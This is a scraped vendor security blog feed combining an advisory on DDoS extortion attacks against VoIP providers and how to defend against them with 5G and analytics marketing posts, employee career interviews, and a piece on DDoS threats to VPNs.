	<li>DDoS Extortion attacks against VoIP providers have resulted in outages and disruption to operations and services globally</li>
	<li>These attacks leverage well-known DDoS attack vectors which in many cases succeed in disrupting mission-critical services of unprepared&nbsp; VoIP operators</li>
	<li>Following Best Current Practices (BCPs), properly tuning network access control lists (ACLs), and ensuring critical systems/services are protected by modern Intelligent DDoS Mitigation Systems (IDMSes) empowers organizations to successfully defend against these attacks.</li>
</ul>

<h2>Description</h2>

<p>Beginning in September of 2021, multiple providers of Session Initiation Protocol (SIP)/Real-time Transport (RTP) VoIP services globally reported that their respective networks and service delivery infrastructures were being targeted by DDoS extortionists.&nbsp;In early October, the cadence of DDoS extortion attacks increased globally, with both wholesale and retail VoIP providers targeted<br />
<br />
As is commonplace in DDoS extortion scenarios, demonstration DDoS attacks are launched against targeted operators, and emailed extortion demands are subsequently mailed to key personnel within those organizations; follow-up attacks are threatened if the extortion demands are not met. In most (but not all) cases, if the extortion demands are not met, threatened follow-up attacks do not occur, and the attacker moves on to other targets. &nbsp;<br />
<br />
Multiple UDP reflection/amplification DDoS vectors are typically employed in these attacks, alongside direct-path SIP application-layer attacks.&nbsp;In some cases, suboptimal placement of stateful firewalls in front of SIP/RTP session border controllers (SBCs) and VoIP PBXes has negatively impacted the availability and resiliency of targeted SIP/RTP VoIP infrastructure, increasing the susceptibility of targeted service delivery elements to disruption by DDoS attacks.&nbsp;Similarly, the lack of situationally-appropriate network access control policies implemented via access-control lists (ACLs) on hardware-based routers and/or layer-3 switches has allowed attackers to negatively impact some SIP/RTP VoIP operators. These attacks utilized UDP reflection/amplification DDoS vectors to generate DDoS attack traffic which is clearly out of profile for VoIP services.<br />
<br />
While in many cases emailed DDoS extortion demands are never viewed by their intended targets due to poor email address selection on the part of the attacker, it appears that over the course of this particular attack campaign, due diligence has generally been exercised in identifying email mailboxes which are likely to be actively monitored by targeted organizations.</p>

<h2>Collateral Impact</h2>

<p>Successful DDoS attacks against wholesalers of SIP/RTP VoIP services can significantly impact organizations which resell these services at the retail level.&nbsp;Disruption of SIP/RTP VoIP services retailed to end-customers such as enterprises, governmental entities, et. al. can result in the inability to deliver critical products and services, including emergency response, medical care, etc.<br />
<br />
High-volume DDoS attacks can congest peering, transit, core, distribution, and access links, disrupting bystander internet traffic along with legitimate traffic destined for the intended target.&nbsp;Shared networking, computing, storage, and ancillary supporting infrastructure can be negatively impacted by high-volume DDoS attacks.&nbsp;These factors can result in significant collateral damage footprints.<br />
<br />
The collateral impact of UDP reflection/amplification attacks is potentially quite high for organizations and individuals whose misconfigured servers/services are abused as reflectors/amplifiers. This may include partial or full interruption of mission-critical applications and services, as well as additional service disruption due to transit capacity consumption, state-table exhaustion of stateful firewalls and load-balancers, etc.</p>

<h2>Mitigating Factors</h2>

<p>DDoS attack traffic can be mitigated via the implementation of industry-standard best current practices (BCPs) such as situation appropriate network access control policies; network infrastructure-based reaction mechanisms such as flowspec; and intelligent DDoS mitigation systems (IDMSes) such as NETESCOUT Arbor Sightline/TMS and AED/APS.<br />
<br />
Collateral impact to misconfigured, abusable servers/services leveraged as reflectors/amplifiers by attackers in order to launch DDoS attacks can motivate network operators and/or end-customers to remove or remediate affected systems.&nbsp;<br />
<br />
Traceback of spoofed DDoS attack traffic to its ingress points by network operators and subsequent implementation of source-address validation (SAV) can prevent attackers from launching both reflection/amplification and spoofed direct-path DDoS attacks.</p>

<h2>Recommended Actions</h2>

<p>All relevant network infrastructure, architectural and operational BCPs should be implemented by SIP/RTP VoIP operators.&nbsp;<br />
<br />
SIP/RTP VoIP operators should implement situation specific network access control policies via stateless ACLs on hardware-based routers and/or layer-3 switches.&nbsp;Wherever possible, stateful firewalls and/or load-balancers deployed northbound of SBCs and SIP/RTP PBXes should be removed; if these stateful devices cannot be immediately removed, they must be protected against DDoS attacks in the same manner as the SBCs and SIP/RTP PBXes sited behind them. &nbsp;<br />
<br />
Protocols and ports used by different SIP/RTP VoIP services may vary considerably based upon operator configuration choices.&nbsp;Return traffic related to outbound SIP and RTP sessions generally requires reciprocal inbound network access control policy stanzas to be implemented.&nbsp;Whenever possible, network access control policies restricting access to SIP/RTP VoIP services should be implemented via situation specific network access control policies.</p>

<ul>
	<li>It is imperative that SIP/RTP VoIP operators have a detailed understanding of the specific protocols and ports required by their service delivery infrastructure (and that of their customers/correspondents) in order to craft situation appropriate network access control policies and to provision relevant DDoS countermeasures.&nbsp;</li>
</ul>

<p>DDoS defenses for all public-facing internet properties and supporting infrastructure should be implemented in a situation appropriate manner, including periodic testing to ensure that any changes to organization’s servers/services/applications are incorporated into its DDoS defense plan.&nbsp;Organic, on-site intelligent DDoS mitigation capabilities should be combined with cloud- or transit-based upstream DDoS mitigation services in order to ensure maximal responsiveness and flexibility during an attack.<br />
<br />
Whenever possible, separate IP addresses should be used for receiving inbound SIP/RTP sessions and for initiating outbound SIP/RTP sessions.&nbsp;This practice facilitates the implementation of more granular network access control policies and DDoS countermeasure provisioning.<br />
<br />
<em>flowspec</em> can be used by network operators to mitigate both UDP reflection/amplification DDoS attacks and SIP/RTP application-layer DDoS attacks.&nbsp;It is important to ensure that reaction access-control list (ACL) stanzas propagated via flowspec are configured in such a way to minimize the risk of overblocking.&nbsp;<br />
<br />
Authoritative and recursive DNS services for SIP/RTP VoIP operators&nbsp;<strong>MUST</strong>&nbsp;be protected against DDoS attacks in order for VoIP services to function.&nbsp;AIF Templates providing examples DDoS countermeasure provisioning for DNS servers are available to AIF-entitled Sightline/TMS operators under the titles ‘DNS Recursive Server’ and ‘DNS Authoritative Server’, respectively.<br />
<br />
It is imperative that organizations operating mission-critical public-facing Internet properties and/or infrastructure ensure that all servers/services/application/datastores/infrastructure elements are protected against DDoS attack, and are included in periodic, realistic tests of the organization’s DDoS mitigation plan.&nbsp;In many instances, we have encountered situations in which obvious elements such as public-facing Web servers were adequately protected, but authoritative DNS servers, application servers, and other critical service delivery elements were neglected, thus leaving them vulnerable to attack.<br />
<br />
All potential DDoS attack mitigation measures described in this Summary&nbsp;<strong>MUST</strong>&nbsp;be tested and customized in a situation appropriate manner prior to deployment on production networks.</p>

<p>Finally, organizations must never pay DDoS extortionists, because they will continue to attack and demand larger payments, and other threat actors will learn of the payments and attack organizations known to have made extortion payments to attackers.</p>

  <title>5G Demand Is Here: Is Your 5G Network Ready?</title>
  <link>http://localhost:7996/blog/your-5g-network-ready</link>
  <description>5G Technology allows communication service providers (CSPs) to deliver the fast, seamless service consumers and enterprises demand.</description>
  <content:encoded><![CDATA[<p>With the growing demand for technologies to improve our lives in ways both large (telemedicine and self-driving tractors, for example) and small (smart thermostats, smoothly streaming entertainment experiences, and the like) communications service providers (CSPs) need to deliver fast, seamless service across their networks.</p>

<p>According to the recent report <a href="https://www.ericsson.com/en/reports-and-papers/consumerlab/reports/harnessing-the-5g-consumer-potential"><em>Harnessing the 5G Consumer Potential Study</em></a>, the worldwide 5G network market could be worth USD 31 trillion by 2030 and CSPs could earn a total of USD 131 billion in direct revenues from 5G-enabled digital services, with almost 40 percent of this revenue coming from enhanced video and immersive media. Obviously, CSPs want to maximize these projected <a href="https://www.netscout.com/solutions/5g#component--7">new 5G-based revenue opportunities</a>.</p>

<p>Effective ROI for 5G applications and networks requires CSPs to offer ultra-reliable, low-latency communications (URLLC) and support for enhanced mobile broadband, mission-critical communications, and the massive number of Internet of Things (IoT) devices in use while anticipating their exponential . Industry forecasts predict <a href="https://www.statista.com/statistics/760275/5g-mobile-subscriptions-worldwide/">3 billion</a> 5G subscriptions by 2025. </p>

<p>Currently, most 5G networks use a non- architecture linking an LTE core to new radios that support 5G frequency bands, allowing CSPs to leverage 3G and 4G existing investments while gradually rolling out broader 5G capabilities. However, many carriers are also now deploying standalone 5G networks based on a new cloud-native 5G core, allowing them to extend virtualized technologies out to the <a href="https://www.netscout.com/solutions/radio-access-network-monitoring-visibility-analytics-5g-4g">radio access network (RAN)</a> and distribute cloud-based services <a href="https://www.netscout.com/success-stories/orchestrated-service-assurance">out to the edge.</a> “5G standalone represents a paradigm shift, since it is effectively designed to build a network that is cloud-ready, including a new set of functions that are desegregated and adapted to a flexible, service-based architecture.” noted NETSCOUT Associate Vice President of Product Management Paolo Trevisan at the company’s annual conference.</p>

<p>As <a href="https://www.lightreading.com/search.asp">LightReading</a>’s Karen Brown wrote in <a href="https://www.netscout.com/sites/default/files/2021-04/Netscout-ebook-5G-Signals-New-Issues.pdf"><em>5G Signals New Challenges with Network Monitoring &amp; Performance</em></a><em>:</em> “Indeed, assuring network monitoring and control becomes more critical as the industry transitions from the initial non-standalone 5G framework that relied on a 4G network core to a fully 5G standalone scheme. The non-standalone scheme helped to speed adoption of 5G, but the standalone upgrade provides the real payoff for operators, offering edge compute and cloud native capabilities. This lays the groundwork for consumer applications such as low-latency artificial reality/virtual reality (AR/VR) video and cloud gaming, and it supports new and potentially lucrative enterprise applications with faster response times thanks to 5G standalone’s network edge elements. 5G’s ability to blend a wider range of wireless spectrum including cellular, unlicensed and licensed mid-band and millimeter wave (mm Wave) frequencies also gives operators new opportunities to deliver more flexible hybrid fixed and mobile services with expanded reach and data speeds.”</p>

<p><strong>Managing 5G Open Architectures</strong></p>

<p>The complexity of 5G networks presents significant management challenges for CSPs, who are looking for the most effective and cost-efficient way forward. In the past, RANs were built with all the components coming from a single network equipment vendor. This approach has proven to be excessively expensive and does not readily lend itself to the innovation necessary for 5G. Instead, the industry has been pushing and adopting , which ultimately will be required for 5G to reach its maximum potential. Standalone 5G continues to open the network by using virtual networking architectures such as software-defined networking (SDN), <a href="https://www.netscout.com/nfv-smarter-video">network functions virtualization (NFV)</a>, containerization, and 5G network slicing, which allows CSPs to meet service-level agreement (SLA)-specific requirements for connectivity, speed, and capacity. And 5G <em>is</em> fast. How fast? From 10x to a predicted 100x faster than 4G.</p>

<p>The best way to assure service <em>and</em> security across such architectures is to use packet data for <a href="https://www.netscout.com/blog/smart-data-key-5g-assurance-and-security">real-time visibility</a> across all layers of the network—from physical, to virtual, to cloudified services and automation. This includes all dependencies in an open architecture, with an end-to-end view of all components in both physical and virtual multigenerational networks.</p>

<p><img alt="5G Ready Now Powerpoint Slide" data-entity-type="file" data-entity-uuid="2ae71ba0-8e3d-4fef-8600-f050cc91ca79" src="http://localhost:7996/sites/default/files/inline-images/5greadynow_0.png" /></p>

<p>Using a software-based approach to gain visibility into a CSP’s network environment and conduct real-time analysis of 3rd Generation Partnership Project (3GPP)-based packet data to generate smart data at its point of collection is key to monitoring the health and security between all components. And injecting machine learning (ML) and artificial intelligence (AI) investigatory routines into this smart data elevates the analytics possible from such IP traffic data into actionable intelligence to guide network operations, engineering and marketing decisions, and provide fuel for the orchestration layer to achieve automation.</p>

<p>Because of the dynamic nature of 5G development and the complexity of these networks, it makes good sense for CSPs to look for a <a href="https://videos.netscout.com/watch/MxZ7xucjQTzH9DFKH5b37K">single source of truth</a> to create the holistic visibility necessary for 5G security and service assurance. And rather than relying on in-house efforts, CSPs would be well-served by selecting an independent vendor that offers an affordable software-based approach to end-to-end visibility.</p>

  <title>Cybersecurity Careers Are Exciting and Fulfilling!</title>
  <link>http://localhost:7996/blog/cybersecurity-careers-are-exciting-and-fulfilling</link>
  <description>Cybersecurity is more important than ever, and there is a wide variety of jobs in the field.</description>
  <content:encoded><![CDATA[<p><em>Part two of a two-part series</em></p>

<p>In honor of this week’s theme for <a href="https://www.cisa.gov/cybersecurity-awareness-month">Cybersecurity Month</a>, <em>Explore. Experience. Share</em>. – <a href="https://www.nist.gov/itl/applied-cybersecurity/nice/events/cybersecurity-career-awareness-week">Cybersecurity Career Awareness Week</a><em>, </em>we’ve interviewed some of our Guardians about their careers in cybersecurity.</p>

<h3><img alt="Richard Hummel" data-entity-type="file" data-entity-uuid="4a03fc47-7417-4fc8-9ceb-f499e248d065" src="http://localhost:7996/sites/default/files/inline-images/hummel_blog_headshot.jpg" /></h3>

<h3>Richard Hummel, ASERT Threat Research Lead</h3>

<p><strong>Tell us about your job. </strong>Many jobs can be the same thing day after day, but in the cybersecurity world every day is unique. Any day can bring a threat we’ve never seen before and in the <a href="https://www.netscout.com/blog/asert/the-long-tail-adversary-innovation">distributed denial of service (DDoS</a>) world, a vector that’s novel and takes advantage of unsuspecting victims to launch devastating attacks against our customers. The thrill of figuring out how to combat these threats and even stay ahead of them makes me passionate about this career path.</p>

<p><strong>How is your job related to cybersecurity?</strong> My job <em>is</em> cybersecurity. On the <a href="https://www.netscout.com/threatreport">Threat Intelligence</a> team, we live and breathe the threat landscape, specifically as it pertains to <a href="https://www.netscout.com/blog/asert/crossing-10-million-mark-ddos-attacks-2020">DDoS</a>. Additionally, I am passionate about staying informed about ransomware and various other cybercrime threats that seek to extort and steal money from victims. From the time I “punch in” at the start of the day and “clock out” at the end, I’m trying to anticipate the moves of adversaries and the needs of our customers so that I can direct my team toward what’s most important.</p>

<p><strong>How did you get interested in cybersecurity?</strong> Accidentally? Fate? Destiny? All of the above? When I joined the Army, I signed up for Signals Intelligence and eventually became certified to perform Computer Network Operations/Digital Network Intelligence. This set me on the path into cybersecurity, and after my tour in the Army, I taught myself to reverse engineer malware and worked tracking cyber criminals.</p>

<p><strong>What do you like about working at NETSCOUT?</strong> I love the values NETSCOUT ascribes to. I never have to wonder if I should take care of my family or work first. Family ALWAYS comes first, and it fosters a healthy work/life balance that is critical to achieving synergy across the teams and organization. I also love the flexibility of leading/directing the Threat Intelligence mission. Never once have I thought my creativity and drive were stifled because of “politics or bureaucracy”. Since beginning my position as NETSCOUT I’ve worked 100% remote and I love the ability to set my hours, work with colleagues all over the world, and it’s only a 10 second commute to my office!</p>

<p><strong>What does being a Guardian of the Connected World mean to you?</strong> Exactly what it sounds like and, that’s exactly what our mission and mandate is. We strive to ensure that our customers are protected, and their businesses always remain connected to vital assets that allows them to function and drive revenue. In a day where connectivity is increasingly critical to our way of life, it becomes even more imperative that this connection never wavers. NETSCOUT products protect those vital connections from abusers and adversaries all over the world.</p>

<p><strong>Any advice for people considering cybersecurity as a career?</strong> Never stop learning. Stagnation in a cybersecurity career will quickly invalidate your ideas and authority as you struggle to adapt to the constantly changing landscape. A smart, dedicated person who is a self-starter is often much more valuable in this career field than someone with decades of education who refuses to adapt to the changing threats and technology.</p>

<h3>Danielle Fritz, Software Engineer</h3>

<p><strong>Tell us about your job. </strong>My job is never dull! I am a software engineer and primarily work on the user interface for our product. This entails having conversations with others on my team about the work and features we are developing (other software engineers, or quality assurance engineers, or extended members of the team.) We use an agile process to be nimbler in our approach, and reactions to changes in requirements and scope, and sometimes even user testing. I also regularly research the security industry, going to tech talks to learn more about it, and attending user research sessions to understand how our customers use our product, to make it better and easier for them to use.</p>

<p><strong>How is your job related to cybersecurity? </strong>I work on the <a href="https://www.netscout.com/product/arbor-sightline">Sightline</a> product, which is a network visibility and security product, allowing our customers to see what is happening inside their networks. With Sightline + <a href="https://www.netscout.com/product/arbor-threat-mitigation-system">TMS</a> we can also block and mitigate cyber threats. This is a big responsibility, as we are building the software that some of the biggest internet service providers and companies use to secure their networks and the backbone of the internet. We are integral in keeping the Internet up and running! This mission gives a lot of meaning to my job, and gives me focus in my work.</p>

<p><strong>How did you get interested in cybersecurity? </strong>Cybersecurity is such an important part of keeping our connected society running, without it, we would lose all the connected resources we rely on every day. Ecommerce, banking, gaming, medical institutions, communications, without the internet and networks functioning, all this would fall apart! I take my job as a Guardian of the Connected world quite seriously, and feel I am providing an important service in keeping our modern society functional.</p>

<p><strong>What do you like about working at NETSCOUT?</strong> Honestly, my favorite parts of my job are often the “people” parts. The parts where I get to talk to people, have discussions, solve problems, make decisions, move initiatives forward together, as a team. I have found that our best solutions are a collaboration of many minds and domains, a blend of different backgrounds and thinking, that allow us to come to solutions that are more well-rounded and fully featured. When we all bring our best selves to the table, and are honest and open and respectful, we can come up with some amazing ideas and bring them to fruition! NETSCOUT is very much a learning-focused company and is a great place to start or expand your career. </p>

<p><strong>Any advice for people considering cybersecurity as a career?</strong></p>

<p>If I had to give someone advice about pursuing a cybersecurity career, I would say jump in with both feet, and immerse yourself in the industry! There is a lot to learn (we call it “drinking from the firehose”) but you will NOT be bored! So if you love learning, you should come join us! Enthusiasm goes a long way! </p>

<p>In honor of this week’s theme for Cybersecurity Awareness Month, <em>Explore. Experience. Share.</em> – <a href="https://www.netscout.com/cybersecurity-awareness">Cybersecurity Career Awareness Week</a>, we interviewed some of our Guardians about their careers in cybersecurity. See what it’s like to be a Guardian of the Connected World at NETSCOUT and why cybersecurity is a rewarding career path.</p>

<h3><img alt="Stephanie Busby" data-entity-type="file" data-entity-uuid="aa4a5842-3359-48b5-9480-69ec5b9b7caa" src="http://localhost:7996/sites/default/files/inline-images/Stephanie%20Busby.png" width="300" /></h3>

<h3>Stephanie Busby, Senior Security Compliance Analyst</h3>

<p><strong>Tell us about your job. </strong>I’d say it’s fun! My role as a compliance analyst has two main parts: the audit side and the education side. The education side is fun to me. It gives me an opportunity share in security awareness with the rest of the company and get others outside of security excited about it. I also like being able to share security awareness with others. NETSCOUT culture in general encourages people to want to learn more about it, and that makes my job easier and more enjoyable.</p>

<p><strong>How is your job related to cybersecurity?</strong> To me, cybersecurity means taking measures to protect both my personal and company information. For example, I work hard for my money, so I would hate to have an account drained just because I used an easy-to-guess password! Cybercriminals and technology are getting to be more and more sophisticated, so we must continue to grow and develop good cyber hygiene to avoid data leaks. Part of my role is to educate the whole company on current best practices in cybersecurity for both their professional and personal lives.</p>

<p><strong>How did you get interested in cybersecurity?</strong> I started as a high school intern here at NETSCOUT, working for <a href="https://www.netscout.com/debby-briggs-bio">Debby Briggs</a>, NETSCOUT’s chief security officer. She put me on some fun projects that involved spreading security education materials to the company. Before this role I had no idea what cybersecurity even was. After it, I had a much better understanding of cyber hygiene that I was able to also share with family and friends. My interest has just continued to grow and develop from there.</p>

<p><strong>What do you like about working at NETSCOUT?</strong> I love working here because NETSCOUT has done a great job establishing a strong, healthy company culture. NETSCOUT makes work-life balance possible. The people I work with are very collaborative and always willing to help. It makes doing a job easier when you enjoy the place you work.</p>

<p><strong>What does being a Guardian of the Connected World mean to you</strong>? It means doing my part to keep customer and company information protected.</p>

<p><strong>Any advice for people considering cybersecurity-related careers?</strong> Having a good mentor can help you navigate the field, because there are so many different avenues you can go down. Cybersecurity is an ever-growing field and a great place to be.</p>

<h3>Rossitza Grozeva, Director, Product Management</h3>

<p><strong>Tell us about your job. </strong>It is very exciting to me, because I get to learn and work on the <em>newest </em>new technologies in cybersecurity, information technology, and networks across markets and businesses worldwide. We create innovative products that help our enterprise and service provider (SP) customers to manage, optimize, and secure their network and services. Every customer is unique, and creating products that can help a variety of applications and use cases is challenging and rewarding. In my work as a product manager, I am communicating with internal (engineering, marketing, service) and external (sales, customers) teams. I like getting their different perspectives and finding the best solutions.</p>

<p><strong>How is your job related to cybersecurity? </strong>The product I work on is called <a href="https://www.netscout.com/product/cyber-investigator">Omnis Cyber Intelligence</a>. It provides unique insights into the baseline of normal operations, suspicious activity, hacker mindset, cyberthreats in action, and anomalous behavior, both in real time and retrospectively. It enables security operations teams to assess the exposure of their network and optimize their defenses. Cybersecurity is important for everyone. In the past cybersecurity was perceived as the responsibility of IT teams. Modern attacks take place on multiple levels. Attackers are using social engineering and people as the resource to gain access and launch attacks.</p>

<p><strong>How did you get interested in cybersecurity? </strong>I did the transition gradually. I started my career working on enterprise networks, then moved to <a href="https://www.netscout.com/blog/healthcare-organization-resolves-dicom-access-issue">monitoring and service assurance</a> for SP networks, and in the last few years, as security became more important and the demand from customers increased, I started working on solutions for enterprise and SP security.</p>

<p><strong>What do you like about working at NETSCOUT?</strong> I like the company’s people-oriented culture. NETSCOUT operates on the “lean but not mean” principle driven by our CEO and executive management. The company mission is to seek the best not only for the shareholders and employees, but also for the society. NETSCOUT is a great employer.</p>

<p><strong>What does being a Guardian of the Connected World mean to you? </strong>For me, it means solving the toughest problems in the connected world, delivering value to our customers, and working toward the greater good for society.</p>

<p><strong>Any advice for people considering cybersecurity-related careers? </strong>Cybersecurity covers a variety of areas—technical/engineering, social engineering, compliance/regulations, risk analysis, legal, and law enforcement. There are multiple career paths they can take.</p>

  <title>Why Are VPNs Such PrimeTargets for DDoS Attacks?</title>
  <link>http://localhost:7996/blog/why-are-vpns-ddos-targets</link>
  <description>Work-from-home strategies make VPNs an increasingly attractive target for DDoS attacks. The best protection is an intelligent DDoS mitigation solution that operates in a stateless or semi-stateless manner.</description>
  <content:encoded><![CDATA[<p>It seems as if each day brings more harrowing stories about DDoS attacks that have been waged against enterprises, with each attack seemingly lasting longer and costing more than the ones before. There’s almost a tendency to view the bad actors who wage these DDoS attacks as masterminds of new technology and strategies for bringing down the networks of global enterprises.</p>

<p>In reality, however, many of the <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="4dbce3cf-7733-47a9-96be-6afc3fa09c28" href="http://localhost:7996/what-is-ddos" title="What Is a Distributed Denial of Service (DDoS) Attack?">DDoS attacks </a>waged against enterprises target components that have long been a part of the network—things such as virtual private network (VPN) devices, firewalls, load balancers and other edge devices. Such devices contain state information used to route and manage traffic. This makes them susceptible to DDoS attacks. More specifically, state exhaustion DDoS attacks which are designed to fill finite sized state tables with illegitimate connections - ultimately denying legitimate connections access to the services behind them.</p>

<p>According to NETSCOUT’s 1H 2021 <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="53806033-3b19-40b7-9497-c2ae36b5b200" href="http://localhost:7996/threatreport" title="DDoS Threat Intelligence Report">Threat Intelligence Report</a>, more than 41,000 DDoS attacks were leveled against commercial VPNs in the first half of the year. With this level of threat, it’s vital for enterprises to understand why bad actors target VPNs and what can be done to stop such attacks.</p>

<p><strong>Severing a Needed Connection</strong></p>

<p>As the pandemic has forced companies to support work-from-home (WFH) and other remote-work initiatives, those enterprises increasingly have turned to VPNs to link remote workers to corporate resources. At the same time, cyberattacks have increased DDoS attacks against VPNs—for several reasons.</p>

<p>Such attacks disconnect users from their organization’s online assets, and they also serve to prevent security teams from responding to these and other types of cyberattacks. But the pandemic also forced enterprises to expand digital services to customers and vendors, massively expanding the potential impact of an attack against the corporate VPN.</p>

<p>According to NETSCOUT’S Worldwide Infrastructure Security Survey (WISR), cybercriminals know that corporations are more exposed while employees are working remotely, which provides the only motivation they need to launch targeted DDoS attacks against VPNs and other stateful devices. In fact, 83 percent of WISR enterprise respondents reported DDoS attacks targeting firewalls and/or VPN devices contributed to a service outage—an increase of 21 percent from 2019.</p>

<p><strong>The Solution: Intelligent, Stateless Mitigation</strong></p>

<p>The only way to stop DDoS attacks against enterprise VPNs is to implement an intelligent DDoS mitigation solution that operates in a stateless or semi-stateless manner and integrates the following features:</p>

<ul><li>Predominantly uses stateless packet processing technology.</li>

  <title>NWDAF with Smart Analytics Based on Smart Data</title>
  <link>http://localhost:7996/blog/nwdaf-with-smart-analytics</link>
  <description>To reap the full benefits from automation and analytics, CSPs need to operate based on a single data source that is vendor-, technology-, and cloud-agnostic. NETSCOUT Smart Data and Omnis Analytics can help.</description>
  <content:encoded><![CDATA[<p><em>Authored by Rick Fulwiler and John English (Part 2 of 2)</em></p>

<p>To reap the full benefits from automation and analytics, communications service providers (CSPs) need to operate based on a single data source. Then there’s digital transformation (DX), which also requires a single data source across the 5G radio access network (RAN), edge, and core. The problem is, data at CSPs is nearly always siloed. And without a single data source, different functional network teams operate on different truths, so to speak. To arrive at a single source of truth, however, CSPs need to find a single source of data that is vendor-, technology-, and cloud-agnostic.</p>

<p>One such option is NETSCOUT Smart Data. The foundation of NETSCOUT’s service intelligence is smart data, which is derived from direct access to the wired data source—namely, the IP packets that traverse the 5G stand-alone (SA) service-based architecture. NETSCOUT Omnis Analytics takes the raw power of NETSCOUT Smart Data to the next level by recognizing business impact across any CSP network. By injecting specific domain knowledge into highly tuned artificial intelligence (AI) and machine learning (ML) algorithms, Omnis Analytics drives a powerful workflow automation engine that can quickly isolate business impact across multiple domains, from access to core, automatically providing actionable business intelligence that otherwise might have taken days to if not weeks to isolate—and in a visually intuitive display.</p>

<p>The combined capabilities of NETSCOUT Smart Data and Omnis Analytics make up the cornerstone of NETSCOUT's ability to provide advanced 5G analytics to drive closed-loop automation use cases as defined within the 3GPP network data analytics function (NWDAF) specification. Omnis Analytics goes beyond providing a list of fixed use cases: It provides an environment that is pliable to how the carrier works and what drives the carrier’s business—which is where the line of business in the CSP organization needs to help define use cases that impact business.</p>

<p>Omnis applications take advantage of NETSCOUT’s powerful Smart Data framework, which is a multi-technology, multidimensional, subscriber-based data set that contains rich application and network metrics derived directly from packets: the ultimate source of truth.</p>

<p><strong>Omnis Analytics Supports 3GPP NWDAF Use Cases</strong></p>

<p>NETSCOUT’s Omnis Analytics product suite is designed to help resolve the increasing network complexity added by 5G. Omnis uses Smart Data to simplify the underlying changes in the 5G network, including virtualization and cloudification of the core, edge computing, network slicing, and the RAN. It executes millions of investigative iterations regardless of network deployment to find the issues with the highest impact and their underlying causality.</p>

<p>Omnis Analytics can address the use cases outlined in 3GPP TR23.791 for formula-based AI/ML analytics; with this solution, we expect impacted user experience detection/prediction cases will be important. There is great value in any measurement that can assist in closed-loop automation use cases. To be successful, each of these NWDAF use cases requires the highest level of data resolution, which NETSCOUT can provide. . Our virtual data acquisition engines can take in RAN metrics and core-control and user-plane packet-level data without burdening the carrier, because user-plane traffic scales in response to traffic increases. From there, we apply our domain knowledge, which is built into our AI algorithms, to drive specific use cases.</p>

<p>Omnis Analytics increases network and operational engineering efficiency by removing the data overload engineers face and providing focus on issues with the highest impact to subscribers and services. It automates the discovery of service-impacting events by removing many of the time-consuming, manual steps currently employed</p>

<p><img alt="nwdaf-with-smart-analytics-based-on-smart-data" data-entity-type="file" data-entity-uuid="f4b14aac-eb46-45cd-b247-206a88e1cbf6" src="http://localhost:7996/sites/default/files/inline-images/CS-107-EN-2101-WEB.png" /></p>

<p>NETSCOUT believes that carriers need a platform that is pliable to how they work and what drives their business. Once line-of-business executives in a carrier’s organization help to define business use cases, NETSCOUT overlays more than 30 years of telecom experience into business analytics checklists that sift through terabytes of data for unique outliers to determine network function loading, device mobility, subscriber user experience, and network-related Information such as quality of service (QoS), sustainability, and RAN congestion, just to name a few.</p>

<p>Omnis Analytics improves customer experience by decreasing trouble-ticket resolution times; it also helps network operators provide increased service quality. Chasing individual trouble tickets is tedious, time-consuming, and requires customer involvement in the quality process, whereas automated workflows will lower the need for customer interaction when troubleshooting service issues.</p>

<p><strong>Which NWDAF Cases</strong><strong>?</strong></p>

<p>5G slicing can benefit from NWDAF. Despite 3GPP specifications focusing on the , carriers likely begin with the RAN domain, where NWDAF data can drive dynamic radio topology, power control settings on mm-Wave, employ interference mitigation techniques, add energy efficiency improvements, identify RAN SLA slice violations, and so on. From there, the mobile operator can introduce additional uses cases, bringing in dynamic resource allocation for areas such as multi-edge computing (MEC), core, and QoS optimization. It is still early going with network slicing implementation, but low-latency network slices will need the most immediate real-time adjustments with live network operation.</p>

<p>Although we expect it to be a very important use case for NWDAF, carriers will likely first implement static network slicing rather than the nirvana of dynamic or elastic slicing on demand. The RAN is the first point in the mobile network to address slicing issues. By identifying cell congestion and notifying the Policy Control Function (PCF) of that condition, it is able it to throttle traffic to mitigate the congestion.</p>

<p>From a service assurance perspective, NETSCOUT Smart Data sees the slice identifiers—slice/service type (SST), enhanced mobile broadband (eMMB), ultra-reliable low-latency communications (URLLC), mobile Internet of Things (mIoT), and video transmitter (Vtx), with the optional slice differentiator ()—that differentiate between similar slices. This resolution allows Smart Data to report on the health and well-being of each slice as identified by these markers. Being able to create events based upon any service-level violation that might occur related to each slice essentially means NETSCOUT provides tracking slices as a service.</p>

<p>An area in which the 3GPP specifications are silent is the role NWDAF could play in helping to detect anomalies that might be related to security threats. For example, when many IoT devices become infected with malware—and given that a key tenant of 5G is its high data rates—IoT clusters could create a massive distributed denial-of-service (DDoS) attack or even signaling storms through the network. This type of bandwidth consumption anomaly is something NETSCOUT’s visibility capabilities can detect. When suddenly an IoT device that was producing a few megabytes starts to produce gigabytes per hour, that is something that needs attention. Another example would be a user equipment (UE) device sending traffic that does not use its allocated IP address. This is a key in the battle against the DDoS attack vector leveraging reflection amplification.</p>

<p><strong>Why NETSCOUT for NWDAF?</strong></p>

<p>The NWDAF needs a solution that can deliver the required visibility and actionable business intelligence at the scale, complexity, and pace that the modern IT networks are operating. In a multivendor environment, carriers will need a vendor-agnostic solution such as that provided by NETSCOUT. Our comprehensive end-through-end view with Adaptive Service Intelligence (ASI) Smart Data allows us to address the 3GPP NWDAF 5G use cases and much more at each functional area of the network (RAN, core, edge, and network slice), as well as determine network, service, and device-behavioral anomalies that impact user experience. Our customer-first approach propels our proactive stance to help our customers solve their most pressing business use cases, enabling them to ensure real ROI and productivity gains and move toward predictive and prescriptive solutions with automation.</p>

  <title>Threat Intelligence Plays Vital Role in Modern Cybersecurity Strategies</title>

  <content:encoded><![CDATA[<p>Companies that do business on the internet or use network connections in any way, shape, or form are vulnerable to cyberattack. And let’s face it, that includes pretty much everyone these days. According to the <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="53806033-3b19-40b7-9497-c2ae36b5b200" href="http://localhost:7996/threatreport" title="DDoS Threat Intelligence Report">1H 2021 NETSCOUT Threat Intelligence Report</a>, there were nearly 5.4 million distributed denial-of-service (DDoS) attacks in the first half of 2021.</p>

<p>But although the threat landscape is often discussed in terms of attack numbers, experts in threat intelligence tend to think in terms of people: the adversaries behind the attacks. During a recent NETSCOUT OnGuard webinar, a panel of security researchers from NETSCOUT’s threat intelligence team discussed the vital role threat intelligence plays in a modern cybersecurity strategy.</p>

<p><strong>How Threat Intelligence Helps</strong></p>

